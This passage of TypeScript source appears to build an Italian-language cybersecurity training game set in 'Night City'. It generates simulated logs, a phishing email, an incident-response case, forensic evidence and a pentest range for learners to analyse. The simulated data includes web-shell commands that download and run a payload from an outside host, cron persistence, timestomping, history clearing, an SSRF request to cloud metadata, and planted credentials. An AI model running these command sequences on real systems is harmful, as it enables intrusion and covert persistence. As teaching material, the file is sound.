  add('vpn', 'LOGIN_OK', 'marta', '10.0.0.30');
  add('mail', 'LOGIN_FAIL', 'enzo', '10.0.0.31');
  add('mail', 'LOGIN_OK', 'enzo', '10.0.0.31');
  return lines.join('\n') + '\n';
}

/** Richieste DNS della rete aziendale. */
function buildDnsLog(): string {
  const q: [string, string][] = [
    ['pc-amministrazione', 'mail.nc-company.net'],
    ['pc-reception', 'www.nc-news.net'],
    ['pc-magazzino', 'update.nightos.net'],
    ['pc-reception', 'update-checker.top'],
    ['pc-amministrazione', 'banca.nc'],
    ['pc-reception', 'update-checker.top'],
    ['pc-direzione', 'calendar.nc-company.net'],
    ['pc-reception', 'update-checker.top'],
  ];
  return q.map(([h, d], i) => `2077-11-12T09:${String(10 + i * 3).padStart(2, '0')}:00 ${h} query ${d}`).join('\n') + '\n';
}

/** Una cattura di traffico in stile tcpdump -n -A (semplificata). */
function buildCapture(): string {
  const L: string[] = [];
  let t = 0;
  const ts = () => {
    t += 137;
    const s = 21 * 3600 + 10 * 60 + Math.floor(t / 1000);
    const p2 = (n: number) => String(n).padStart(2, '0');
    return `${p2(Math.floor(s / 3600))}:${p2(Math.floor((s % 3600) / 60))}:${p2(s % 60)}.${String(t % 1000).padStart(3, '0')}000`;
  };
  L.push(`${ts()} IP 192.168.1.33.53211 > 192.168.1.1.53: 4410+ A? jukebox.lan. (29)`);
  L.push(`${ts()} IP 192.168.1.1.53 > 192.168.1.33.53211: 4410 1/0/0 A 192.168.1.20 (45)`);
  L.push(`${ts()} IP 192.168.1.33.50512 > 192.168.1.20.80: Flags [S], seq 1000, length 0`);
  L.push(`${ts()} IP 192.168.1.20.80 > 192.168.1.33.50512: Flags [S.], seq 2000, ack 1001, length 0`);
  L.push(`${ts()} IP 192.168.1.33.50512 > 192.168.1.20.80: Flags [.], ack 2001, length 0`);
  L.push(`${ts()} IP 192.168.1.33.50512 > 192.168.1.20.80: Flags [P.], length 98: HTTP: POST /pannello/login HTTP/1.1`);
  L.push('        Host: jukebox.lan');
  L.push('        Content-Type: application/x-www-form-urlencoded');
  L.push('        utente=mama&password=Scantinato2077');
  L.push(`${ts()} IP 192.168.1.20.80 > 192.168.1.33.50512: Flags [P.], length 140: HTTP: HTTP/1.1 302 Found`);
  L.push(`${ts()} IP 192.168.1.12.44120 > 192.168.1.30.443: Flags [P.], length 517`);
  L.push('        ..\\.......=..j.Q*.....(dati TLS cifrati: illeggibili)....z..');
  for (const port of [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 3389, 8080]) {
    L.push(`${ts()} IP 192.168.1.66.61000 > 192.168.1.20.${port}: Flags [S], seq 777, length 0`);
    L.push(
      `${ts()} IP 192.168.1.20.${port} > 192.168.1.66.61000: Flags [${[22, 23, 80].includes(port) ? 'S.' : 'R.'}], length 0`,
    );
  }
  return L.join('\n') + '\n';
}

/** Eventi di sicurezza di Windows esportati in CSV: ora,EventID,computer,utente,dettaglio */
function buildWinEvents(): string {
  const L: string[] = ['# ora,EventID,computer,utente,dettaglio'];
  let t = 22 * 60;
  const ev = (id: number, host: string, user: string, det: string) => {
    t += 1;
    L.push(`2077-11-12 ${String(Math.floor(t / 60)).padStart(2, '0')}:${String(t % 60).padStart(2, '0')},${id},${host},${user},${det}`);
  };
  ev(4624, 'DC01', 's.neri', 'accesso riuscito tipo 2 (interattivo)');
  ev(4624, 'PC-COSTA', 'l.costa', 'accesso riuscito tipo 10 (RDP)');
  for (const u of ['s.neri', 'm.ferri', 'l.costa', 'a.bassi', 'stagista', 'Administrator', 'svc_backup'])
    ev(4625, 'DC01', u, 'accesso non riuscito: password errata, da 10.0.5.66');
  ev(4625, 'DC01', 'a.bassi', 'accesso non riuscito: password errata, da 10.0.5.66');
  ev(4624, 'DC01', 'a.bassi', 'accesso riuscito tipo 3 (rete), da 10.0.5.66');
  ev(4672, 'DC01', 'a.bassi', 'privilegi speciali assegnati al nuovo accesso');
  ev(4720, 'DC01', 'a.bassi', 'creato account utente: helpdesk2');
  ev(4728, 'DC01', 'a.bassi', 'aggiunto membro helpdesk2 al gruppo Domain Admins');
  ev(4688, 'PC-BASSI', 'a.bassi', 'nuovo processo: powershell.exe -enc SQBFAFgA...');
  ev(7045, 'PC-BASSI', 'SYSTEM', 'installato servizio "WinUpdater" C:\\Users\\Public\\upd.exe');
  ev(1102, 'PC-BASSI', 'a.bassi', 'il registro di controllo è stato cancellato');
  return L.join('\n') + '\n';
}

/** Capitoli 07 e 08: il negozio online di Judy (audit OWASP) e la campagna di phishing al SOC. */
function addShopAndMail(sh: Shell, home: string, mine: { owner: string; group: string }): void {
  const fs = sh.fs;
  sh.net.hosts.push({
    ip: '10.20.0.90',
    names: ['negozio.lan', 'negozio'],
    mac: '',
    pingable: true,
    latency: 2.4,
    ttl: 64,
    ports: [{ port: 80, service: 'http', version: 'Apache httpd 2.4.29' }],
    inScope: true,
  });
  addSite('10.20.0.90', {
    headers: ['Server: Apache/2.4.29 (Ubuntu)', 'X-Powered-By: PHP/5.6.40', 'Set-Cookie: SESSIONE=7f3a91c2; path=/'],
    pages: {
      '/': {
        body: [
          '<!DOCTYPE html>',
          '<html><head><title>Judy BD - braindance artigianali</title></head>',
          '<body>',
          '  <h1>Judy BD</h1>',
          '  <p>Braindance artigianali, spedizione in tutta Night City.</p>',
          '  <form action="http://negozio.lan/login.php" method="GET">',
          '    <input name="user"> <input name="pass" type="password"> <button>Entra</button>',
          '  </form>',
          '  <a href="/anteprima.php?url=https://nightcity.nc/news">Anteprima notizie</a>',
          '</body></html>',
        ].join('\n'),
      },
      '/ordine.php?id=1041': {
        body: ['<html><body>', '<h2>Ordine 1041</h2>', '<p>Cliente: Account di prova (contratto di audit)</p>', '<p>Articolo: BD "Pioggia su Japantown" x1</p>', '<p>Pagamento: carta di prova **** 0000</p>', '</body></html>'].join('\n'),
      },
      '/ordine.php?id=1042': {
        body: [
          '<html><body>',
          '<h2>Ordine 1042</h2>',
          '<p>Cliente: Evelyn P.</p>',
          '<p>Indirizzo: Jig-Jig Street 12, Japantown</p>',
          '<p>Articolo: BD "Lizzie\'s Bar, notte" x2</p>',
          '<p>Pagamento: carta **** 4421</p>',
          '</body></html>',
        ].join('\n'),
      },
      '/config.php.bak': {
        type: 'text/plain',
        body: ['<?php', '// configurazione del negozio (copia prima delle modifiche)', "define('DB_HOST', 'localhost');", "define('DB_NAME', 'negozio');", "define('DB_USER', 'shop_admin');", "define('DB_PASS', 'Braindance2077!');", '?>'].join('\n'),
      },
      '/robots.txt': { type: 'text/plain', body: 'User-agent: *\nDisallow:' },
    },
  });
  fs.writeFile(
    `${home}/web/negozio-contratto.txt`,
    [
      'CONTRATTO DI AUDIT - Judy BD (negozio online)',
      'Autorizza: Judy Alvarez, titolare. Esegue: il team di Rook.',
      '',
      'PERIMETRO',
      '  http://negozio.lan/  (sito di test, copia esatta di quello in produzione)',
      '  log del server: web/negozio.log',
      '',
      'ACCOUNT DI PROVA',
      '  utente "audit", con un ordine di prova: numero 1041',
      '',
      'AUTORIZZATO',
      '  richieste manuali con curl; UNA richiesta a un ordine non tuo (1042) per verificare la segnalazione del cliente',
      '',
      'VIETATO',
      '  scaricare dati di clienti oltre la singola verifica; strumenti automatici; modificare ordini',
      '',
      'NOTE DELLA TITOLARE',
      '  Lo sviluppatore fa una copia dei file prima di modificarli. Non so dove le lascia.',
      '',
      'EMERGENZE',
      '  Se trovi password o dati di pagamento esposti: chiamare subito Judy, 555-0177',
    ].join('\n') + '\n',
    mine,
  );
  const L: string[] = [];
  const t = (m: number, sec: number) => `[13/Nov/2077:21:${String(m).padStart(2, '0')}:${String(sec).padStart(2, '0')} +0100]`;
  const UA = '"Mozilla/5.0 (Linux; Android 14)"';
  L.push(`192.168.7.21 - - ${t(0, 4)} "GET / HTTP/1.1" 200 812 "-" ${UA}`);
  L.push(`192.168.7.21 - - ${t(0, 9)} "GET /login.php?user=judy&pass=Kabuki2077 HTTP/1.1" 302 0 "-" ${UA}`);
  L.push(`192.168.7.33 - - ${t(1, 2)} "GET /ordine.php?id=1038 HTTP/1.1" 200 640 "-" ${UA}`);
  L.push(`192.168.7.33 - - ${t(1, 40)} "GET /anteprima.php?url=https://nightcity.nc/news HTTP/1.1" 200 2210 "-" ${UA}`);
  for (let i = 0; i < 9; i++) L.push(`203.0.113.9 - - ${t(3, 10 + i)} "GET /login.php?user=admin&pass=${['admin', '123456', 'password', 'judy', 'negozio', 'qwerty', 'letmein', 'admin1', 'shop'][i]} HTTP/1.1" 200 410 "-" "python-requests/2.31"`);
  L.push(`198.51.100.40 - - ${t(5, 2)} "GET /anteprima.php?url=http://localhost/server-status HTTP/1.1" 200 1530 "-" "curl/8.5.0"`);
  L.push(`198.51.100.40 - - ${t(5, 7)} "GET /anteprima.php?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 312 "-" "curl/8.5.0"`);
  L.push(`192.168.7.33 - - ${t(6, 30)} "GET /ordine.php?id=1038 HTTP/1.1" 200 640 "-" ${UA}`);
  L.push(`192.168.7.40 - - ${t(8, 1)} "GET / HTTP/1.1" 200 812 "-" ${UA}`);
  fs.writeFile(`${home}/web/negozio.log`, L.join('\n') + '\n', mine);

  // --- la campagna di phishing (capitolo 08)
  fs.writeFile(
    `${home}/posta/segnalazione.txt`,
    [
      'SEGNALAZIONE PHISHING #4471 - ricevuta alle 09:42',
      'Da: m.ruiz (amministrazione)',
      '',
      '"Mi è arrivata una fattura scaduta da Arasaka con minaccia di sospensione.',
      ' Non mi risulta nessun debito. Non ho cliccato. Allego l\'email originale."',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/posta/fattura.eml`,
    [
      'Received: from mx1.arasaka-logistics.nc (10.4.0.25)',
      '        by mailbox.arasaka-logistics.nc; Fri, 13 Nov 2077 09:31:07 +0100',
      'Received: from relay.cheap-mail.nc (198.51.100.17)',
      '        by mx1.arasaka-logistics.nc; Fri, 13 Nov 2077 09:31:05 +0100',
      'Received: from mail.arasaka-pagamenti.nc (203.0.113.88)',
      '        by relay.cheap-mail.nc; Fri, 13 Nov 2077 09:31:02 +0100',
      'Authentication-Results: mx1.arasaka-logistics.nc;',
      '        spf=fail (arasaka.nc does not designate 203.0.113.88 as permitted sender)',
      '        dkim=none; dmarc=fail (p=none) header.from=arasaka.nc',
      'Return-Path: <billing@arasaka-pagamenti.nc>',
      'From: "Arasaka - Ufficio Pagamenti" <pagamenti@arasaka.nc>',
      'Reply-To: <recupero.crediti77@mailbox.nc>',
      'To: m.ruiz@arasaka-logistics.nc',
      'Subject: URGENTE: fattura scaduta - sospensione del servizio entro 24 ore',
      'Date: Fri, 13 Nov 2077 09:31:00 +0100',
      'Content-Type: text/html; charset=UTF-8',
      '',
      '<p>Gentile cliente,</p>',
      '<p>la fattura n. 2077-5512 risulta <b>non pagata</b>. Senza regolarizzazione entro 24 ore',
      'il servizio verrà sospeso e la pratica passerà al recupero crediti.</p>',
      '<p><a href="https://arasaka.nc.pagamenti-sicuri.nc/fatture/login">Visualizza e paga la fattura</a></p>',
      '<p>Ufficio Pagamenti - Arasaka</p>',
    ].join('\n') + '\n',
    mine,
  );
  const users = ['m.ruiz', 'k.tanaka', 't.okafor', 'l.moreau', 'd.santos', 'p.ivanova'];
  const D: string[] = [];
  let n = 0;
  for (const u of ['a.berg', 'r.cole']) D.push(`2077-11-13 08:${String(10 + n++).padStart(2, '0')}:00 delivered to=${u} from=newsletter@nightcity.nc subject="Novità della settimana"`);
  users.forEach((u, i) => D.push(`2077-11-13 09:31:${String(5 + i).padStart(2, '0')} delivered to=${u} from=pagamenti@arasaka.nc subject="URGENTE: fattura scaduta - sospensione del servizio entro 24 ore"`));
  D.push('2077-11-13 09:40:12 delivered to=k.tanaka from=it@arasaka-logistics.nc subject="Manutenzione stampanti"');
  fs.writeFile(`${home}/posta/consegne.log`, D.join('\n') + '\n', mine);
  fs.writeFile(
    `${home}/posta/proxy.log`,
    [
      '2077-11-13 09:33:41 user=k.tanaka GET https://intranet.arasaka-logistics.nc/ 200',
      '2077-11-13 09:35:02 user=l.moreau GET https://arasaka.nc.pagamenti-sicuri.nc/fatture/login 200',
      '2077-11-13 09:36:17 user=t.okafor GET https://arasaka.nc.pagamenti-sicuri.nc/fatture/login 200',
      '2077-11-13 09:36:58 user=t.okafor POST https://arasaka.nc.pagamenti-sicuri.nc/fatture/login 302',
      '2077-11-13 09:37:00 user=t.okafor GET https://www.arasaka.nc/ 200',
      '2077-11-13 09:51:20 user=m.ruiz GET https://intranet.arasaka-logistics.nc/segnala 200',
    ].join('\n') + '\n',
    mine,
  );
}

/** Capitolo 08 (gestione dell'incidente) e capitolo DF (analisi forense): il caso Kiroshi. */
function addIncident(sh: Shell, home: string, mine: { owner: string; group: string }): void {
  const fs = sh.fs;
  const A = '198.51.100.23';
  const day = '2077-11-14';
  fs.writeFile(
    `${home}/ir/allarme.txt`,
    [
      'SIEM - ALLARME #20771114-0031     gravità: ALTA',
      `ora:        ${day} 02:31:07`,
      'regola:     "Server web avvia connessione in uscita"',
      'host:       web01.kiroshi.nc (10.30.0.10)',
      'processo:   kworker   utente: www-data   pid: 31337',
      `destinazione: ${A}:4444 (sync.kiroshi-cdn.nc)`,
      'nota:       il server web non ha motivo di aprire connessioni verso Internet',
    ].join('\n') + '\n',
    mine,
  );
  const web = [
    `${day} 01:58:02 web 10.30.0.77 GET / 200`,
    `${day} 02:03:15 web 192.0.2.41 GET /prodotti 200`,
    `${day} 02:09:41 web ${A} GET / 200`,
    `${day} 02:10:02 web ${A} GET /profilo 200`,
    `${day} 02:11:30 web ${A} GET /profilo/foto 200`,
    `${day} 02:12:18 web ${A} POST /profilo/foto (avatar.php, 2.1 KB) 200`,
    `${day} 02:13:05 web ${A} GET /uploads/avatar.php?cmd=id 200`,
    `${day} 02:13:40 web ${A} GET /uploads/avatar.php?cmd=uname+-a 200`,
    `${day} 02:14:22 web ${A} GET /uploads/avatar.php?cmd=curl+-s+-o+/tmp/sfondo_mare.jpg+https://files.pastebox.nc/k 200`,
    `${day} 02:15:01 web ${A} GET /uploads/avatar.php?cmd=sh+/tmp/s.sh 200`,
    `${day} 02:40:12 web 192.0.2.41 GET /prodotti/occhiali 200`,
  ];
  const auth = [
    `${day} 01:00:01 auth CRON[1201]: pam_unix(cron:session): session opened for user root`,
    `${day} 02:15:44 auth sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/php-sess`,
    `${day} 02:20:13 auth sshd[4410]: Failed password for root from ${A} port 50122 ssh2`,
    `${day} 02:20:15 auth sshd[4410]: Failed password for root from ${A} port 50124 ssh2`,
  ];
  const proc = [
    `${day} 02:14:23 proc user=www-data pid=30990 cmd=curl -s -o /tmp/sfondo_mare.jpg https://files.pastebox.nc/k`,
    `${day} 02:15:02 proc user=www-data pid=31301 cmd=mkdir -p /tmp/.x`,
    `${day} 02:15:03 proc user=www-data pid=31302 cmd=cp /tmp/sfondo_mare.jpg /tmp/.x/kworker`,
    `${day} 02:15:10 proc user=www-data pid=31337 cmd=/tmp/.x/kworker`,
    `${day} 02:15:44 proc user=root pid=31340 cmd=tee /etc/cron.d/php-sess (cron: */10 * * * * www-data /tmp/.x/kworker)`,
    `${day} 02:15:50 proc user=root pid=31342 cmd=touch -d 2071-06-02 /etc/cron.d/php-sess`,
    `${day} 02:31:07 proc user=www-data pid=31337 cmd=/tmp/.x/kworker net=connect ${A}:4444`,
  ];
  fs.writeFile(`${home}/ir/web.log`, web.join('\n') + '\n', mine);
  fs.writeFile(`${home}/ir/auth.log`, auth.join('\n') + '\n', mine);
  fs.writeFile(`${home}/ir/processi.log`, proc.join('\n') + '\n', mine);
  fs.writeFile(
    `${home}/ir/report.md`,
    [
      '# Report di incidente - web01.kiroshi.nc',
      '',
      '## Sintesi',
      'Nella notte del 14/11 un attaccante ha preso il controllo del server web e installato un programma che comunicava con l\'esterno.',
      '',
      '## Cronologia',
      '- 02:09 primo contatto',
      '- 02:31 allarme SIEM',
      '',
      '## Causa',
      '',
      '',
      '## Impatto',
      '',
      '## Azioni',
      '- server isolato alle 02:44',
      '',
      '## Raccomandazioni',
      '',
    ].join('\n'),
    mine,
  );

  // --- prove forensi
  const disk = ['DISKIMG web01.kiroshi.nc /dev/sda (simulata)', 'settori 0-41943039', 'partizione 1: ext4 /', 'acquisita con write blocker, 2077-11-14 04:02'].join('\n') + '\n';
  const diskB = disk.replace('settori 0-41943039', 'settori 0-41943038');
  fs.writeFile(
    `${home}/forense/custodia.txt`,
    [
      'CATENA DI CUSTODIA - Caso KIR-2077-014',
      '',
      'REPERTO 1: disco del server web01.kiroshi.nc',
      '  2077-11-14 03:50  ritirato da: V. Rook (sala server Kiroshi), sigillo n. 0441',
      '  2077-11-14 04:02  acquisito con write blocker da: N. Kaur, immagine disco.img',
      `  SHA-256 originale: ${sha256(disk)}`,
      '  2077-11-14 04:40  creata copia-a.img (N. Kaur)',
      '  2077-11-14 04:41  creata copia-b.img (N. Kaur)',
      '  2077-11-14 06:15  copie consegnate al laboratorio (firma: Nyx)',
      '  originale conservato nella cassaforte 2, sigillo n. 0442',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(`${home}/forense/copie/copia-a.img`, disk, mine);
  fs.writeFile(`${home}/forense/copie/copia-b.img`, diskB, mine);
  const elf = [
    '\u007fELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0002\u0000>\u0000',
    '\u0001\u0000\u0000\u0000/lib64/ld-linux-x86-64.so.2\u0000\u0000libc.so.6',
    '\u0000\u0004\u0000connect\u0000socket\u0000fork\u0000\u0000',
    'nc-crawler v2.3\u0000\u0001\u0003\u0002',
    'sync.kiroshi-cdn.nc\u0000\u0000:4444\u0000\u0000',
    '/etc/cron.d/php-sess\u0000\u0000*/10 * * * *\u0000',
    '\u0000\u0000/tmp/.x/kworker\u0000\u0002\u0001',
    '\u0000\u0000GCC: (Ubuntu 11.4.0) 11.4.0\u0000',
  ].join('\n');
  const est = `${home}/forense/estratti`;
  fs.writeFile(`${est}/sfondo_mare.jpg`, elf, mine);
  fs.writeFile(`${est}/profilo_judy.jpg`, 'ÿØÿà\u0000\u0010JFIF\u0000\u0001\u0001\u0000\u0000\u0001', mine);
  fs.writeFile(`${est}/listino_2077.pdf`, '%PDF-1.7\n1 0 obj << /Title (Listino Kiroshi 2077) >> endobj\n', mine);
  fs.writeFile(`${est}/leggimi.txt`, 'Cartella degli upload del sito: foto profilo dei clienti.\n', mine);
  fs.writeFile(
    `${home}/forense/bollettino.txt`,
    [
      '# CERT di Night City - IOC condivisi, settimana 46/2077',
      '# SHA-256                                                          FAMIGLIA        NOTE',
      `${sha256('neonlocker sample 1')}  NeonLocker      ransomware, cifra con estensione .neon`,
      `${sha256(elf)}  NightCrawler    backdoor Linux, persistenza via cron, C2 su porta 4444`,
      `${sha256('glitchstealer build 7')}  GlitchStealer   furto di password dai browser`,
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/forense/timeline.csv`,
    [
      '2077-11-14 02:15:44,B,root,/etc/cron.d/php-sess',
      '2077-11-14 02:12:18,B,www-data,/var/www/html/uploads/avatar.php',
      '2077-11-14 02:16:30,B,www-data,/tmp/.x/kworker.log',
      '2077-11-13 23:10:00,M,www-data,/var/www/html/cache/index.tmp',
      '2077-11-14 02:15:03,B,www-data,/tmp/.x/kworker',
      '2071-06-02 10:00:00,M,root,/etc/cron.d/php-sess',
      '2077-11-14 02:15:50,C,root,/etc/cron.d/php-sess',
      '2077-11-14 02:14:23,B,www-data,/tmp/sfondo_mare.jpg',
      '2077-11-14 02:31:07,A,www-data,/tmp/.x/kworker',
      '2077-11-12 08:00:00,M,root,/etc/cron.d/logrotate',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/forense/www-data/.bash_history`,
    [
      'id',
      'uname -a',
      'cd /tmp',
      'curl -s -o /tmp/sfondo_mare.jpg https://files.pastebox.nc/k',
      'mkdir -p /tmp/.x && cp sfondo_mare.jpg /tmp/.x/kworker',
      'chmod +x /tmp/.x/kworker && /tmp/.x/kworker &',
      'echo "*/10 * * * * www-data /tmp/.x/kworker" | sudo tee /etc/cron.d/php-sess',
      'sudo touch -d 2071-06-02 /etc/cron.d/php-sess',
      'history -c',
    ].join('\n') + '\n',
    mine,
  );
}

/** Capitolo PY: script da completare o riparare, firmware, storage cloud. */
function addPython(sh: Shell, home: string, mine: { owner: string; group: string }): void {
  const fs = sh.fs;
  const py = `${home}/py`;
  fs.writeFile(
    `${py}/rotto.py`,
    [
      '# Conta quante parole ci sono in una frase.',
      'frase = "chi controlla i computer controlla la citta"',
      'parole = frase.split()',
      'if len(parole) > 5',
      '    print("Frase lunga")',
      'print("Parole:", len(parola))',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${py}/porte.py`,
    [
      '# Porte aperte trovate da nmap sul server del cliente',
      'aperte = [22, 80, 443, 21, 3389, 23, 8080]',
      '',
      '# Porte che non dovrebbero MAI essere esposte a Internet',
      'rischiose = {21: "FTP", 23: "Telnet", 445: "SMB", 3389: "RDP"}',
      '',
      '# TODO: per ogni porta aperta, se è tra le rischiose stampa una riga così:',
      '#   ATTENZIONE: porta 21 (FTP)',
      '',
    ].join('\n'),
    mine,
  );
  fs.writeFile(
    `${py}/cvss.py`,
    [
      'def gravita(punteggio):',
      '    # TODO: restituisci "critica" (9.0-10), "alta" (7.0-8.9), "media" (4.0-6.9),',
      '    # "bassa" (0.1-3.9) oppure "nessuna" (0.0)',
      '    return "?"',
      '',
      '',
      'for p in [9.8, 7.5, 5.3, 2.1, 0.0, 9.0, 7.0, 4.0]:',
      '    print(p, gravita(p))',
    ].join('\n') + '\n',
    mine,
  );
  const fw: Record<string, string> = {
    'router.bin': 'FWIMG router-nc 4.2.1\nsezione kernel ok\nsezione rootfs ok\n',
    'switch.bin': 'FWIMG switch-nc 2.0.9\nsezione kernel ok\nsezione rootfs ok\n',
    'camera.bin': 'FWIMG camera-nc 1.7.3\nsezione kernel ok\nsezione rootfs ok\n',
  };
  const manifest: string[] = [];
  for (const [n, c] of Object.entries(fw)) {
    // la telecamera è stata alterata dopo la pubblicazione dell'impronta ufficiale
    fs.writeFile(`${py}/aggiornamenti/${n}`, n === 'camera.bin' ? c + 'telnetd -p 2323 &\n' : c, mine);
    manifest.push(`${sha256(c)}  ${n}`);
  }
  fs.writeFile(`${py}/manifesto.txt`, manifest.join('\n') + '\n', mine);
  fs.writeFile(
    `${py}/storage.json`,
    JSON.stringify(
      [
        { nome: 'neon-promo-2077', lettori: ['*'], note: 'immagini del sito, pubbliche per scelta' },
        { nome: 'neon-fatture', lettori: ['ruolo-amministrazione'] },
        { nome: 'neon-backup-clienti', lettori: ['ruolo-backup', '*'] },
        { nome: 'neon-log', lettori: ['ruolo-sicurezza'] },
      ],
      null,
      2,
    ) + '\n',
    mine,
  );
  fs.writeFile(
    `${py}/da_controllare.txt`,
    ['missioni/benvenuto.txt', 'caso/sparito.log', 'caso/auth.log', '/etc/shadow', 'web/vecchio.log'].join('\n') + '\n',
    mine,
  );
}

/** Capitolo PT: il server di Kang Tao da sottoporre a penetration test, e la sua versione corretta. */
function addRange(sh: Shell, home: string, mine: { owner: string; group: string }): void {
  const host = (ip: string, names: string[], ports: [number, string, string][]): Host => ({
    ip,
    names,
    mac: '',
    pingable: true,
    latency: 2.2,
    ttl: 64,
    ports: ports.map(([port, service, version]) => ({ port, service, version })),
    inScope: true,
  });
  sh.net.hosts.push(
    host('10.20.0.120', ['range.lan', 'range'], [
      [22, 'ssh', 'OpenSSH 7.6p1 Ubuntu 4ubuntu0.7'],
      [80, 'http', 'Apache httpd 2.4.29 ((Ubuntu))'],
      [3306, 'mysql', 'MySQL 5.7.33-0ubuntu0.18.04.1'],
      [8080, 'http', 'Jetty 9.4 (Jenkins 2.150)'],
    ]),
    host('10.20.0.121', ['range2.lan', 'range2'], [
      [22, 'ssh', 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.10'],
      [80, 'http', 'Apache httpd 2.4.58 ((Ubuntu))'],
      [8080, 'http', 'Jetty 10.0 (Jenkins 2.440)'],
    ]),
  );
  addSite('10.20.0.120', {
    headers: ['Server: Apache/2.4.29 (Ubuntu)'],
    pages: {
      '/': { body: '<html><head><title>Kang Tao Logistica</title></head><body><h1>Kang Tao Logistica</h1><p>Portale spedizioni - in allestimento.</p></body></html>' },
      '/robots.txt': { type: 'text/plain', body: 'User-agent: *\nDisallow: /old/' },
      '/old/': {
        body: [
          '<html><head><title>Index of /old</title></head><body>',
          '<h1>Index of /old</h1>',
          '<pre>',
          '<a href="../">Parent Directory</a>',
          '<a href="config.php.save">config.php.save</a>      2077-10-02 11:40  412',
          '<a href="logo_vecchio.png">logo_vecchio.png</a>     2077-09-20 09:12  18K',
          '</pre></body></html>',
        ].join('\n'),
      },
      '/old/config.php.save': {
        type: 'text/plain',
        body: ['<?php', '// configurazione del portale (copia di nano prima delle modifiche)', "$db_host = 'localhost';", "$db_user = 'webapp';", "$db_pass = 'Spedizioni2077!';", '// TODO: stessa password dell\'utente di sistema webapp, cambiarla', '?>'].join('\n'),
      },
    },
  });
  addSite('10.20.0.121', {
    headers: ['Server: Apache'],
    pages: {
      '/': { body: '<html><head><title>Kang Tao Logistica</title></head><body><h1>Kang Tao Logistica</h1><p>Portale spedizioni.</p></body></html>' },
      '/robots.txt': { type: 'text/plain', body: 'User-agent: *\nDisallow:' },
    },
  });

  const mkServer = (name: string, user: string, fixed: boolean) => {
    const v = new Vfs();
    for (const d of ['/bin', '/tmp', '/var/log', '/root', '/home', '/etc/ssh', '/etc/sudoers.d', '/opt/backup', '/var/www/html'])
      v.mkdirp(d, d === '/root' ? { perms: 'rwx------', locked: true } : d === '/tmp' ? { perms: 'rwxrwxrwt' } : {});
    v.writeFile('/etc/hostname', name + '\n');
    v.writeFile(
      '/etc/passwd',
      ['root:x:0:0:root:/root:/bin/bash', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'webapp:x:1001:1001:Portale:/home/webapp:/bin/bash', 'verifica:x:1002:1002:Riverifica:/home/verifica:/bin/bash'].join('\n') + '\n',
    );
    v.writeFile('/etc/shadow', '(hash delle password)\n', { perms: 'rw-r-----', locked: true });
    v.writeFile('/etc/crontab', ['# m h dom mon dow user  command', '17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly', '*/5 * * * *  root  /opt/backup/backup.sh'].join('\n') + '\n');
    v.writeFile('/opt/backup/backup.sh', '#!/bin/bash\n# copia notturna del portale\ntar czf /var/backups/portale.tgz /var/www/html\n', { perms: 'rwxrwxrwx' });
    v.writeFile(
      '/etc/sudoers.d/webapp',
      fixed ? '# 2077-11-15 rimosso dopo il pentest (rischio: vim come root)\n# webapp ALL=(root) NOPASSWD: /usr/bin/vim\n' : 'webapp ALL=(root) NOPASSWD: /usr/bin/vim\n',
      { perms: 'r--r-----' },
    );
    v.mkdirp(`/home/${user}`, { owner: user, group: user });
    v.writeFile(`/home/${user}/LEGGIMI.txt`, fixed ? 'Account per la riverifica del pentest. Sola lettura.\n' : 'Portale spedizioni. Non toccare /old senza avvisare.\n', { owner: user });
    v.writeFile('/var/www/html/index.html', '<h1>Kang Tao Logistica</h1>\n', { owner: 'www-data' });
    v.writeFile('/var/log/auth.log', 'Nov 14 15:40:02 range sshd[2201]: Accepted password for webapp from 192.168.1.50 port 50544 ssh2\n', { perms: 'rw-r-----', locked: true });
    sh.remotes.set(fixed ? '10.20.0.121' : '10.20.0.120', {
      hostname: name,
      fs: v,
      users: [user],
      banner: fixed
        ? ['Welcome to Ubuntu 22.04.4 LTS (GNU/Linux)', '', ' * Server ricostruito dopo il pentest. Account "verifica": sola lettura.']
        : ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Password accettata: è la stessa trovata in /old/config.php.save.'],
      sudo: fixed ? {} : { webapp: ['(root) NOPASSWD: /usr/bin/vim'] },
      listening: fixed ? [[22, 'sshd'], [80, 'apache2'], [8080, 'java']] : [[22, 'sshd'], [80, 'apache2'], [3306, 'mysqld'], [8080, 'java']],
    });
  };
  mkServer('range', 'webapp', false);
  mkServer('range2', 'verifica', true);

  fs(sh).writeFile(
    `${home}/pentest/regole.txt`,
    [
      'CONTRATTO DI PENETRATION TEST - Kang Tao Logistica',
      'Autorizza: T. Hanako, direttrice IT (firma digitale allegata). Esegue: team di Rook.',
      '',
      'TIPO DI TEST',
      '  grey box: conosciamo l\'indirizzo del server e il suo scopo, nessun account fornito',
      '',
      'PERIMETRO',
      '  range.lan (10.20.0.120): nuovo server del portale spedizioni, prima della messa in produzione',
      '  dopo le correzioni: range2.lan (10.20.0.121), account "verifica" fornito per la riverifica',
      '',
      'ESCLUSO',
      '  10.20.0.122  server di produzione: non scansionare, non contattare',
      '',
      'FINESTRA',
      '  dal 14/11 al 16/11, 09:00 - 18:00',
      '',
      'VIETATO',
      '  negazione del servizio; ingegneria sociale; modificare o cancellare dati;',
      '  sfruttare vulnerabilità che possono bloccare i servizi (documentarle)',
      '',
      'CREDENZIALI TROVATE',
      '  consentita UNA prova di accesso, da annotare con data e ora; nessuna modifica al sistema',
      '',
      'EMERGENZE E DATI SENSIBILI',
      '  fermarsi e chiamare T. Hanako, 555-0188',
    ].join('\n') + '\n',
    mine,
  );
  fs(sh).writeFile(
    `${home}/pentest/report.md`,
    [
      '# Penetration test - Kang Tao Logistica (range.lan)',
      '',
      '## Sintesi per la direzione',
      'Il server non è pronto per la produzione: un problema critico e una catena di problemi che porta ai pieni poteri.',
      '',
      '## Perimetro e metodo',
      'Grey box, 14/11/2077, range.lan (10.20.0.120). Escluso 10.20.0.122.',
